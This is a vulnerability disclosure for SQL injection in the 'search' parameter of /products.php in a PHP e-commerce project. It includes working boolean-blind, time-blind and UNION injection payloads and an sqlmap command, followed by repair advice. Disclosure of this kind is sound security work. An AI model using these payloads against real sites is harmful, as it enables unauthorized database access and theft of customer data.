# sourcecodester e-Commerce Site Using PHP/MySQL V1.0 /products.php SQL injection

# NAME OF AFFECTED PRODUCT(S)
+ e-Commerce Site Using PHP/MySQL

## Vendor Homepage
+ [homepage](https://www.sourcecodester.com/php/10928/e-commerce-site-using-phpmysql.html)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ WeQi

## Vulnerable File
+ /products.php

## Vulnerability location:
+ 'search' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](sourcecodester.com/download-code?nid=10928&title=e-Commerce+Site+Using+PHP%2FMySQL)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/products.php' file of the 'e-Commerce Site Using PHP/MySQL' project. The reason for this issue is that attackers inject malicious code from the parameter 'search' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "e-Commerce Site Using PHP/MySQL In PHP With Source Code", WeQi discovered a critical SQL injection vulnerability in the "/products.php" file. This vulnerability stems from insufficient user input validation of the 'search' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:
+ boolean-based blind
+ time-based blind
+ UNION query

## Payload:
```plain
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: submit.x=0&submit.y=0&search=-6659' OR 9457=9457#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: submit.x=0&submit.y=0&search=123' AND (SELECT 5793 FROM (SELECT(SLEEP(5)))KpuJ)-- BLuP

    Type: UNION query
    Title: MySQL UNION query (NULL) - 7 columns
    Payload: submit.x=0&submit.y=0&search=123' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b707871,0x4c6875454766484a6d53654f615263467a4d48484c487642565159644943666855584144666e724a,0x7176767071),NULL,NULL,NULL#
---
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -u http://localhost/products.php --data="search=123" --batch
```

![](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773048954616-4bb8a735-3215-4857-9bd9-e2c6feb82549.png)



# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
